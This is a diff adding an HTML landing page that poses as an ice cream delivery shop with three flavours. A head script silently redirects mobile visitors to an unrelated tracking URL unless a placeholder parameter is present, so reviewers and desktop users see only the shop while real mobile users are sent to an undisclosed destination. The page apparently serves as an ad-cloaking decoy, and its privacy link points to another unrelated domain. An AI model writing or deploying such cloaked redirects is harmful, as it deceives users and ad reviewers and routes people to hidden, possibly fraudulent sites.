@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/7030fb24-f71e-4d19-916a-a1c232f79601?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") {
+    } else if (isMobileDevice) {
+        window.location.href = lander;
+    } else {
+    }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Scoop Dreams: Artisanal Ice Cream Delivery</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+        header {
+            background-color: #ff69b4;
+            color: white;
+            text-align: center;
+            padding: 1rem;
+        }
+        main {
+            padding: 20px;
+            max-width: 800px;
+            margin: auto;
+        }
+        .flavor {
+            background-color: white;
+            border-radius: 5px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        .order-button {
+            background-color: #4caf50;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+        }
+        footer {
+            background-color: #333;
+            color: white;
+            text-align: center;
+            padding: 1rem;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Scoop Dreams</h1>
+        <p>Artisanal Ice Cream Delivered to Your Door</p>
+    </header>
+    <main>
+        <div class="flavor">
+            <h2>Lavender Honey</h2>
+            <p>Smooth lavender-infused ice cream with local honey swirls.</p>
+            <button class="order-button">Order Now</button>
+        </div>
+        <div class="flavor">
+            <h2>Matcha Green Tea</h2>
+            <p>Rich, creamy matcha ice cream made with premium Japanese green tea.</p>
+            <button class="order-button">Order Now</button>
+        </div>
+        <div class="flavor">
+            <h2>Salted Caramel Pretzel</h2>
+            <p>Sweet and salty caramel ice cream with crunchy pretzel pieces.</p>
+            <button class="order-button">Order Now</button>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2024 Scoop Dreams. All rights reserved.</p>
+        <a href="https://tokreward.com/privacy.html" style="color: white;">Privacy Policy</a>
+    </footer>
+</body>
+</html>
